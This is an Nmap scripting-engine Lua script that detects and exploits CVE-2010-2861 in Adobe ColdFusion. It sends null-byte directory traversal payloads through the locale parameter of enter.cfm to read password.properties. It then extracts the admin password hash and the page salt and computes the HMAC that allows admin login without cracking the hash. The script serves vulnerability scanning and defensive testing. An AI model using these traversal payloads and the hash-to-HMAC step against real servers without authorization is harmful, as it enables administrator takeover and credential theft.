local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"
local vulns = require "vulns"

local openssl = stdnse.silent_require "openssl"

description = [[
Executes a directory traversal attack against a ColdFusion
server and tries to grab the password hash for the administrator user. It
then uses the salt value (hidden in the web page) to create the SHA1
HMAC hash that the web server needs for authentication as admin. You can
pass this value to the ColdFusion server as the admin without cracking
the password hash.
]]

---
-- @see http-adobe-coldfusion-apsa1301.nse
-- @see http-coldfusion-subzero.nse
-- @see http-vuln-cve2009-3960.nse
--
-- @usage
-- nmap --script http-vuln-cve2010-2861 <host>
--
-- @output
-- 80/tcp open  http
-- | http-vuln-cve2010-2861:
-- |   VULNERABLE:
-- |   Adobe ColdFusion enter.cfm Traversal password.properties Information Disclosure
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2010-2861  OSVDB:67047
-- |     Description:
-- |       Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion
-- |       9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter
-- |     Disclosure date: 2010-08-10
-- |     Extra information:
-- |
-- |   ColdFusion8
-- |   HMAC: d6914bef568f8931d0c696cd5f7748596f97db5d
-- |   Salt: 1329446896585
-- |   Hash: 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
-- |
-- |     References:
-- |       http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking
-- |       http://www.nessus.org/plugins/index.php?view=single&id=48340
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861
-- |       http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2861
-- |_      http://osvdb.org/67047
--
--
-- This script relies on the service being identified as HTTP or HTTPS. If the
-- ColdFusion server you run this against is on a port other than 80/tcp or 443/tcp
-- then use "nmap -sV" so that nmap discovers the port as an HTTP server.

author = "Micah Hoffman"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}


portrule = shortport.http

action = function(host, port)

  local vuln = {
    title = 'Adobe ColdFusion Directory Traversal Vulnerability',
    state = vulns.STATE.NOT_VULN, -- default
    IDS = {CVE = 'CVE-2010-2861', OSVDB = '67047'},
    description = [[
Multiple directory traversal vulnerabilities in the administrator console
in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the
locale parameter]],
    references = {
      'http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking',
      'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2861',
      'http://osvdb.org/67047',
      'http://www.nessus.org/plugins/index.php?view=single&id=48340',
    },
    dates = {
      disclosure = {year = '2010', month = '08', day = '10'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- Function to do the look up and return content
  local grabAndGrep = function(page)
    -- Do the HTTP GET request for the page
    local response = http.get(host, port, page)
    -- Check to see if we get a good page returned
    -- Is there no response?
    if ( not(response.status) ) then
      return false, "Received no response from HTTP server"
    end

    -- Is the response not an HTTP 200 code?
    if ( response.status ~= 200 ) then
      return false, ("The server returned an unexpected response (%d)"):format(response.status )
    end

    -- Now check the body for our strings
    if ( response.body ) then
      local saltcontent = response.body:match("salt.*value=\"(%d+)")
      local hashcontent = response.body:match("password=(%x%x%x%x+)") --Extra %x's needed or it will match strings that are not the long hex password

      -- If a page has both the salt and the password in it then the exploit has been successful
      if ( saltcontent and hashcontent ) then
        vuln.state = vulns.STATE.EXPLOIT
        -- Generate HMAC as this is what the web application needs for authentication as admin
        local hmaccontent = stdnse.tohex(openssl.hmac('sha1', saltcontent, hashcontent)):upper()
        --return true, ("\n\tHMAC: %s\n\tSalt: %s\n\tHash: %s"):format(hmaccontent, saltcontent, hashcontent)
        local result = {
          ("HMAC: %s"):format(hmaccontent),
          ("Salt: %s"):format(saltcontent),
          ("Hash: %s"):format(hashcontent)
        }
        return true, result
      end
    end
    return false, "Not vulnerable"
  end

  local exploits = {
    ['CFusionMX'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en',
    ['CFusionMX7'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en',
    ['ColdFusion8'] = '..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en',
    ['JRun4\\servers'] = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en',
  }

  local results = {}
  for prod, exploit in pairs(exploits) do
    local status, result = grabAndGrep('/CFIDE/administrator/enter.cfm?locale=' .. exploit)
    if ( status or ( not(status) and nmap.verbosity() > 1 ) ) then
      if ( "string" == type(result) ) then
        result = { result }
      end
      result.name = prod
      table.insert(results, result )
    end
  end
  vuln.extra_info=stdnse.format_output(true, results)
  return vuln_report:make_output(vuln)
end
